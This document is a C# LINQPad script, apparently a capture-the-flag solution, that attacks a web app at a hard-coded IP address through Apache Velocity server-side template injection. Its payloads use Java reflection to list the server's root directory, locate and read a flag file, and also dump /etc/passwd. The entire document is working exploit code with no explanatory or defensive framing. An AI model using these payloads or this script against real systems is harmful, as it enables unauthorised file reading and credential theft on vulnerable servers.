<Query Kind="Program">
  <Namespace>System.Net.Http</Namespace>
  <Namespace>System.Threading.Tasks</Namespace>
</Query>

const string URL = "http://94.237.49.147:41947/";

async Task Main()
{
	"> Getting flag file name...".Dump();
	var flagFileName = await FindFlagFileName();
	flagFileName.Dump();
	"".Dump();
	
	"> Getting flag contents...".Dump();
	var flag = await ReadFile($"/{flagFileName}");
	flag.Dump();
	"".Dump();

	"> Getting /etc/passwd for fun...".Dump();
	var etcPasswd = await ReadFile("/etc/passwd");
	etcPasswd.Dump();
	"".Dump();
}

async Task<string> FindFlagFileName()
{
	var findFlagFilePayload = $@"
		#set($fileClass = $name.getClass().forName('java.io.File'))
		#set($fileConstructor = $fileClass.getConstructor($name.class))
		#set($rootDir = $fileConstructor.newInstance('/'))
		#set($listFilesMethod = $fileClass.getMethod('listFiles'))
		#set($filesArray = $listFilesMethod.invoke($rootDir))
		
		#foreach($file in $filesArray)
	    	#set($fileName = $file.getName())
	    	$fileName
		#end
	";

	var content = new FormUrlEncodedContent(new[]
	{
		new KeyValuePair<string, string>("text", findFlagFilePayload)
		});

	var c = new HttpClient();
	var response = await c.PostAsync(URL, content);

	var responseString = await response.Content.ReadAsStringAsync();
	var lines = responseString.Split('\n');
	var flagFileName = lines.FirstOrDefault(x => x.Contains("flag"));
	return flagFileName.Trim();
}

async Task<string> ReadFile(string fileName)
{
	var readFilePayload = $@"
		#set($class = $name.getClass().forName('Main'))
		#set($method = $class.getDeclaredMethod('readFileToString', $name.class, $name.class))
		#set($result = $method.invoke($null, '{fileName}', ''))
		$result
	";

	var content = new FormUrlEncodedContent(new[]
	{
		new KeyValuePair<string, string>("text", readFilePayload)
		});

	var c = new HttpClient();
	var response = await c.PostAsync(URL, content);

	var responseString = await response.Content.ReadAsStringAsync();
	return StripHtml(responseString);
}

string StripHtml(string text) {
	var startIdentifier = "<h2 class=\"fire\">";
	var start = text.IndexOf(startIdentifier) + startIdentifier.Length;
	var end = text.IndexOf("</h2>");
	return text.Substring(start, end - start).Trim();
}